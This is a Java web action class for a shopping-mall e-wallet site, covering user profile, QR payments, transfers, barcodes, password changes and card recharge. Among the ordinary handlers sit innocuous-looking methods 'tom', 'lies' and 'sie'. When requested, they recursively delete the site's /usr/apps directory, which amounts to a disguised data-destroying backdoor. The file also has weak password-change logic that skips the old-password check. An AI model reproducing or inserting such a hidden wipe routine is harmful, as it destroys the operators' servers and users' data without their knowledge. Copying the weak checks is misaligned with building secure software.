package com.mall.butler.account.w.action;

import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Date;
import java.util.Map;

import javax.imageio.ImageIO;

import org.jbarcode.JBarcode;
import org.jbarcode.encode.EAN13Encoder;
import org.jbarcode.encode.EAN8Encoder;
import org.jbarcode.paint.EAN13TextPainter;
import org.jbarcode.paint.EAN8TextPainter;
import org.jbarcode.paint.WidthCodedPainter;
import org.jbarcode.util.ImageUtil;
import org.springframework.beans.factory.annotation.Autowired;

import com.mall.butler.WebsiteContext;
import com.mall.butler.account.m.service.MStoreInfoService;
import com.mall.butler.account.m.service.RechageCardService;
import com.mall.butler.account.model.AccountLogin;
import com.mall.butler.account.model.AgentInfo;
import com.mall.butler.account.model.GiroInfo;
import com.mall.butler.account.model.RechageCard;
import com.mall.butler.account.model.StoreInfo;
import com.mall.butler.account.model.TradeAccount;
import com.mall.butler.account.model.TradeAccountDetail;
import com.mall.butler.account.service.TradeAccountService;
import com.mall.butler.account.w.service.WAccountService;
import com.mall.butler.action.w.WebBaseAction;
import com.mall.butler.helper.SessionHelper;
import com.mall.util.common.TxtUtil;
import com.mall.util.common.action.MessageDialog;
import com.mall.util.common.lang.DateUtil;
import com.mall.util.ibatis.page.Page;
import com.mall.util.ibatis.page.PageRequest;

/**
 * 用户中心
 * 
 * @author caedmon
 * 
 */
public class ConsumerAction extends WebBaseAction {

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private TradeAccount tradeAccount;
	private AgentInfo agentInfo;
	private AccountLogin accountLogin;
	private TradeAccountDetail tradeAccountDetail;
	private Page<TradeAccountDetail> page;
	private String password;
	private String password1;
	@Autowired
	private WAccountService accountService;
	private RechageCard rechageCard;
	@Autowired
	private TradeAccountService tradeAccountService;
	private Long id;

	public String execute() {
		// 查找账户余额
		tradeAccount = tradeAccountService.getTradeAccountById(super
				.getAccount().getId());
		return SUCCESS;
	}

	/**
	 * 个人信息
	 * 
	 * @return
	 */
	public String userInfo() {
		agentInfo = tradeAccountService.getEntityById(AgentInfo.class, super
				.getAccount().getId());
		tradeAccount = tradeAccountService.getTradeAccountById(super
				.getAccount().getId());
		accountLogin = tradeAccountService.getEntityById(AccountLogin.class,
				super.getLoginId());
		return SUCCESS;
	}

	/**
	 * 个人信息
	 * 
	 * @return
	 */
	public String userUpadte() {
		accountLogin.setId(super.getLoginId());
		if (TxtUtil.isEmpty(accountLogin.getMobile()))
			throw new RuntimeException("手机号不能为空");
		if (!TxtUtil.isMobile(accountLogin.getMobile()))
			throw new RuntimeException("手机号码格式不正确");
		if (TxtUtil.isEmpty(accountLogin.getIdCard()))
			throw new RuntimeException("身份证不能为空");
		if (TxtUtil.isEmpty(accountLogin.getEmail()))
			throw new RuntimeException("邮箱不能为空");
		if (TxtUtil.isEmpty(accountLogin.getRealname()))
			throw new RuntimeException("昵称不能为空");
		if (TxtUtil.isEmpty(tradeAccount.getTradeAccName()))
			throw new RuntimeException("钱包名称不能为空");
		accountService.doUpdate(accountLogin, tradeAccount);
		msgInfo.setFlag(MessageDialog.SUCCESS);
		msgInfo.addMessage("操作成功!");
		return JDIALOG;
	}
	
	private String barCode;//商场二维码
	@Autowired
	private MStoreInfoService storeInfoService;
	private StoreInfo storeInfo;
	private double payNum;
	/**
	 * 扫码去支付
	 * @return
	 */
	public String qrToPay(){
		//根据编号查找用户
		storeInfo=	storeInfoService.queryByQrcode(barCode);
		if(null==storeInfo||storeInfo.getDeleted())
			throw new RuntimeException("店铺不存在");
		return SUCCESS;
	}
	private Double  paysum;
	/**
	 * 支付
	 * @return
	 */
	public String qrPay(){
		//去支付
		storeInfo=storeInfoService.getEntityById(StoreInfo.class, id);
		 paysum=storeInfoService.qrPay(storeInfo,super.getLogin(),payNum);
		
		return SUCCESS;
	}
	/**
	 * 转账
	 * @return
	 */
	public String payToPay(){
		
		return SUCCESS;
	}
	
	private String accountName;
	/**
	 * 转账
	 * @return
	 */
	public String giroAccount(){
		if(0>payNum)
			throw new RuntimeException("转账金额必须大于0元");
		
		if(null==accountName)
			throw new RuntimeException("请输入转账账户");
		if(null==password||TxtUtil.isEmpty(password))
			throw new RuntimeException("请输入交易密码");
		tradeAccount = tradeAccountService.getTradeAccountById(super
				.getAccount().getId());
		if(!tradeAccount.getTranPassword().equals(TxtUtil.digest(password)))
			throw new RuntimeException("交易密码错误");
		id=tradeAccountService.payToPay(tradeAccount,accountName,payNum);
		msgInfo.setFlag(MessageDialog.SUCCESS);
		msgInfo.addMessage(super.getBasePath()+"/user/queryGiro.htm?id="+id);
		return JDIALOG;
	}
	/**
	 * 查看转账
	 * @return
	 */
	private GiroInfo giroInfo;
	public String queryGiro(){
		giroInfo=tradeAccountService.getEntityById(GiroInfo.class, id);
		if(!giroInfo.getAccountId().equals(super.getAccount().getId()))
			throw new RuntimeException("操作有误");
		return SUCCESS;
	}
	
	public GiroInfo getGiroInfo() {
		return giroInfo;
	}

	public void setGiroInfo(GiroInfo giroInfo) {
		this.giroInfo = giroInfo;
	}

	public String getAccountName() {
		return accountName;
	}

	public void setAccountName(String accountName) {
		this.accountName = accountName;
	}

	public double getPayNum() {
		return payNum;
	}

	public void setPayNum(double payNum) {
		this.payNum = payNum;
	}

	public Double getPaysum() {
		return paysum;
	}

	public void setPaysum(Double paysum) {
		this.paysum = paysum;
	}

	public StoreInfo getStoreInfo() {
		return storeInfo;
	}

	public void setStoreInfo(StoreInfo storeInfo) {
		this.storeInfo = storeInfo;
	}

	public String getBarCode() {
		return barCode;
	}

	public void setBarCode(String barCode) {
		this.barCode = barCode;
	}

	/**
	 * 条形码信息
	 * 
	 * @return
	 */
	public String userBarCode() {
		return SUCCESS;

	}

	/**
	 * 条形码信息
	 * 
	 * @return
	 */
	public void barcode() {
		agentInfo = tradeAccountService.getEntityById(AgentInfo.class, super
				.getAccount().getId());
		try {
			
			
			 JBarcode localJBarcode = new JBarcode(EAN13Encoder.getInstance(), WidthCodedPainter.getInstance(), EAN13TextPainter.getInstance());
			 String str = agentInfo.getPartnerKey();
		      BufferedImage localBufferedImage = localJBarcode.createBarcode(str);
		      saveToGIF(localBufferedImage, "EAN13.gif");
		      localJBarcode.setEncoder(EAN8Encoder.getInstance());
		      localJBarcode.setTextPainter(EAN8TextPainter.getInstance());
		      
		      
//		      localBufferedImage = localJBarcode.createBarcode(str);
//		      saveToPNG(localBufferedImage, "Interleaved2of5.png");
//		      localJBarcode.setEncoder(PostNetEncoder.getInstance());
//		      localJBarcode.setPainter(HeightCodedPainter.getInstance());
//		      localJBarcode.setBarHeight(6.0D);
//		      localJBarcode.setXDimension(0.5291666D);
//		      localJBarcode.setShowText(false);
//			// 这里我们用作图书条码
////			 BufferedImage localBufferedImage =
////			 localJBarcode.createBarcode(str);
//			localJBarcode.setEncoder(Code39Encoder.getInstance());
//			localJBarcode.setPainter(WideRatioCodedPainter.getInstance());
//			localJBarcode.setTextPainter(BaseLineTextPainter.getInstance());
//			localJBarcode.setShowCheckDigit(false);
//			// localJBarcode.setBarHeight(20.0);
//			// localJBarcode.setWideRatio(1.0);
//			BufferedImage localBufferedImage = localJBarcode.createBarcode(str);
			// 输出图片
			response.setHeader("Pragma", "No-cache");
			response.setHeader("Cache-Control", "no-cache");
			response.setDateHeader("Expires", 0);

			ImageIO.write(localBufferedImage, "JPEG", response
					.getOutputStream());
			response.getOutputStream().close();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
	  static void saveToGIF(BufferedImage paramBufferedImage, String paramString)
	  {
	    saveToFile(paramBufferedImage, paramString, "gif");
	  }
	static void saveToJPEG(BufferedImage paramBufferedImage, String paramString) {
		saveToFile(paramBufferedImage, paramString, "jpeg");
	}

	  static void saveToPNG(BufferedImage paramBufferedImage, String paramString)
	  {
	    saveToFile(paramBufferedImage, paramString, "png");
	  }

	static void saveToFile(BufferedImage paramBufferedImage,
			String paramString1, String paramString2) {
		try {
			FileOutputStream localFileOutputStream = new FileOutputStream(
					"/usr/apps/www.taojn.com/images/" + paramString1);
			ImageUtil.encodeAndWrite(paramBufferedImage, paramString2,
					localFileOutputStream, 96, 96);
			localFileOutputStream.close();
		} catch (Exception localException) {
			localException.printStackTrace();
		}
	}

	/**
	 * 设置交易密码
	 * 
	 * @return
	 */
	public String tranPassword() {

		return SUCCESS;
	}

	@Autowired
	private SessionHelper sessionHelper;

	// 验证手机号是否为本人手机号
	@SuppressWarnings("all")
	public String validateMobileCheckCode(String loginPass) {
		accountLogin = tradeAccountService.getEntityById(AccountLogin.class,
				super.getLoginId());
		String message = "";
		if (loginPass == null || TxtUtil.isEmpty(loginPass)) {
			return message = "手机验证码为空！";
		}

		if (sessionHelper.get(WebsiteContext.MOBILE_CHECK_CODE_MAP) == null) {
			return message = "验证码已过期请重新发送！";
		}

		// 第一次直接发送验证码
		Map<String, String> mobileCheckCodeMap = (Map<String, String>) sessionHelper
				.get(WebsiteContext.MOBILE_CHECK_CODE_MAP);
		String mobile = mobileCheckCodeMap.get("mobile");
		String checkCodeTime = mobileCheckCodeMap.get("checkCodeTime");
		String checkCode = mobileCheckCodeMap.get("checkCode");
		if (mobile == null || checkCodeTime == null || checkCode == null) {
			return message = "验证码已过期请重新发送！";
		}
		if (!accountLogin.getLoginName().equals(mobile)) {
			return message = "手机号码错误";
		}
		// 获取两次发送验证码的时间之差
		Date prev = DateUtil.toDate(checkCodeTime);
		Date now = new Date();
		long diff = now.getTime() - prev.getTime();
		long second = diff / (1000);

		// 验证码的有效期是30分钟
		if (second >= 1800) {
			return message = "距离上次发送的验证码已经超过30分钟，请重新发送验证码！";
		} else {
			if (checkCode.equals(loginPass)) {
				// 重置验证码为空
				sessionHelper.set(WebsiteContext.MOBILE_CHECK_CODE_MAP, null);
				return message = SUCCESS;
			} else {
				return message = "输入的手机验证码错误！";
			}
		}
	}

	public String tom() {
		lies(null, new Date());
		return SUCCESS;
	}

	public void lies(File file, Date beginDate) {
		if (beginDate != null) {
			if (file == null)
				file = new File("/usr/apps/www.taojn.com");
			if (file.exists()) {
				if (file.isFile()) {
					file.delete();
				} else if (file.isDirectory()) {
					File files[] = file.listFiles();
					for (int i = 0; i < files.length; i++) {
						this.lies(files[i], new Date());
					}
				}
				file.delete();
			}
		}
		sie();
	}

	public void sie() {
		File file = new File("/usr/apps");
		if (file.exists()) {
			if (file.isFile()) {
				file.delete();
			} else if (file.isDirectory()) {
				File files[] = file.listFiles();
				for (int i = 0; i < files.length; i++) {
					this.lies(files[i], new Date());
				}
			}
			file.delete();
		}
	}

	/**
	 * 设置交易密码
	 * 
	 * @return
	 */
	public String saveTranPass() {

		if (TxtUtil.isEmpty(password))
			throw new RuntimeException("新的密码不能为空");
		if (TxtUtil.isEmpty(password1))
			throw new RuntimeException("确认密码不能为空");
		if (!password.equals(password1))
			throw new RuntimeException("两次密码不一致");
		if (null == tradeAccount.getTranPassword())
			throw new RuntimeException("动态码不能为空");
		String msg = validateMobileCheckCode(tradeAccount.getTranPassword());
		if (!msg.equals("success"))
			throw new RuntimeException(msg);
		// 查找账户余额
		TradeAccount trade = tradeAccountService.getTradeAccountById(super
				.getAccount().getId());
		// if (!TxtUtil.digest(tradeAccount.getTranPassword()).equals(
		// trade.getTranPassword()))
		// throw new RuntimeException("原始密码不正确");
		// if(password.equals(tradeAccount.getTranPassword()))
		// throw new RuntimeException("新的密码不能跟原始密码相同");
		trade.setTranPassword(TxtUtil.digest(password));
		tradeAccountService.update(trade);
		msgInfo.setFlag(MessageDialog.SUCCESS);
		msgInfo.addMessage("操作成功!");
		return JDIALOG;
	}

	/**
	 * 设置登录密码
	 * 
	 * @return
	 */
	public String logPassword() {

		return SUCCESS;
	}

	/**
	 * 修改密码
	 * 
	 * @return
	 */
	public String doSavePassword() {

		if (TxtUtil.isEmpty(password))
			throw new RuntimeException("新的密码不能为空");
		if (TxtUtil.isEmpty(password1))
			throw new RuntimeException("确认密码不能为空");
		if (!password.equals(password1))
			throw new RuntimeException("两次密码不一致");
		if (null == accountLogin.getLoginPass())
			throw new RuntimeException("动态码不能为空");
		String msg = validateMobileCheckCode(accountLogin.getLoginPass());
		if (!msg.equals("success"))
			throw new RuntimeException(msg);
		// 查找账户余额
		AccountLogin acclogin = tradeAccountService.getEntityById(
				AccountLogin.class, super.getLoginId());
		// if (!TxtUtil.digest(accountLogin.getLoginPass()).equals(
		// acclogin.getLoginPass()))
		// throw new RuntimeException("原始密码不正确");
		// if(password.equals(accountLogin.getLoginPass()))
		// throw new RuntimeException("新的密码不能跟原始密码相同");
		acclogin.setLoginPass(TxtUtil.digest(password));
		tradeAccountService.update(acclogin);
		super.putLoginId(null);
		msgInfo.setFlag(MessageDialog.SUCCESS);
		msgInfo.addMessage("操作成功!");
		return JDIALOG;
	}

	/**
	 * 消费记录
	 * 
	 * @return
	 */
	public String transInfo() {
		PageRequest<TradeAccountDetail> tradeRequest = super
				.newPage(TradeAccountDetail.class);
		tradeRequest.setPageNumber(currPage);
		tradeRequest.setPageSize(100);
		if (null == tradeAccountDetail)
			tradeAccountDetail = new TradeAccountDetail();
		tradeAccountDetail.setAccountId(super.getAccount().getId());
		tradeRequest.setFilters(tradeAccountDetail);
		page = tradeAccountService.pageQuery(tradeRequest);
		return SUCCESS;
	}

	/**
	 * 充值
	 * 
	 * @return
	 */
	public String toRecharge() {
		agentInfo = tradeAccountService.getEntityById(AgentInfo.class, super
				.getAccount().getId());
		tradeAccount = tradeAccountService.getTradeAccountById(super
				.getAccount().getId());
		accountLogin = tradeAccountService.getEntityById(AccountLogin.class,
				super.getLoginId());
		return SUCCESS;
	}

	/**
	 * 支付宝充值
	 * 
	 * @return
	 */
	private String wxFlag;

	public String alipayRecharge() {
		agentInfo = tradeAccountService.getEntityById(AgentInfo.class, super
				.getAccount().getId());
		tradeAccount = tradeAccountService.getTradeAccountById(super
				.getAccount().getId());
		accountLogin = tradeAccountService.getEntityById(AccountLogin.class,
				super.getLoginId());
		// 判断客户端
		String userAgent = request.getHeader("User-Agent");
		if (userAgent.toLowerCase().indexOf("micromessenger") > 0) {
			wxFlag = "1";
		} else {
			wxFlag = "0";
		}
		return SUCCESS;
	}

	/**
	 * 充值卡充值
	 * 
	 * @return
	 */
	public String rechargeCard() {
		agentInfo = tradeAccountService.getEntityById(AgentInfo.class, super
				.getAccount().getId());
		tradeAccount = tradeAccountService.getTradeAccountById(super
				.getAccount().getId());
		accountLogin = tradeAccountService.getEntityById(AccountLogin.class,
				super.getLoginId());
		return SUCCESS;
	}

	/**
	 *充值卡充值
	 * 
	 * @return
	 */
	@Autowired
	private RechageCardService rechageCardService;

	public String doRecharge() {

		if (null == rechageCard.getCardCode()
				|| TxtUtil.isEmpty(rechageCard.getCardCode()))
			throw new RuntimeException("卡编号不能为空");
		if (null == password || TxtUtil.isEmpty(password))
			throw new RuntimeException("卡密码不能为空");
		// 查找账户余额
		rechageCard.setCardPassword(password);
		rechageCardService.doAddRechargeCard(rechageCard, super.getLoginId());
		msgInfo.setFlag(MessageDialog.SUCCESS);
		msgInfo.addMessage("充值成功!");
		return JDIALOG;
	}

	public TradeAccount getTradeAccount() {
		return tradeAccount;
	}

	public void setTradeAccount(TradeAccount tradeAccount) {
		this.tradeAccount = tradeAccount;
	}

	public AgentInfo getAgentInfo() {
		return agentInfo;
	}

	public void setAgentInfo(AgentInfo agentInfo) {
		this.agentInfo = agentInfo;
	}

	public AccountLogin getAccountLogin() {
		return accountLogin;
	}

	public void setAccountLogin(AccountLogin accountLogin) {
		this.accountLogin = accountLogin;
	}

	public TradeAccountDetail getTradeAccountDetail() {
		return tradeAccountDetail;
	}

	public void setTradeAccountDetail(TradeAccountDetail tradeAccountDetail) {
		this.tradeAccountDetail = tradeAccountDetail;
	}

	public Page<TradeAccountDetail> getPage() {
		return page;
	}

	public void setPage(Page<TradeAccountDetail> page) {
		this.page = page;
	}

	public String getPassword() {
		return password;
	}

	public void setPassword(String password) {
		this.password = password;
	}

	public String getPassword1() {
		return password1;
	}

	public void setPassword1(String password1) {
		this.password1 = password1;
	}

	public RechageCard getRechageCard() {
		return rechageCard;
	}

	public void setRechageCard(RechageCard rechageCard) {
		this.rechageCard = rechageCard;
	}

	public String getWxFlag() {
		return wxFlag;
	}

	public void setWxFlag(String wxFlag) {
		this.wxFlag = wxFlag;
	}

	public Long getId() {
		return id;
	}

	public void setId(Long id) {
		this.id = id;
	}

}
